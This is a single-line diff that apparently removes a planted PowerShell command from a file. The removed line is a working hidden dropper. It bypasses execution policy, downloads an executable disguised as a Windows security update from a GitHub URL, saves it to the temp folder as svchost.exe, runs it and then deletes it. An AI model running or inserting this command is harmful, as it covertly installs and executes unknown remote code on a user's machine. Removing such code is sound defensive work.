@@ -1,1 +1,0 @@
-powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u='https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe'; $f='$env:temp\svchost.exe'; iwr $u -out $f; start $f; sleep 5; rm $f -force"
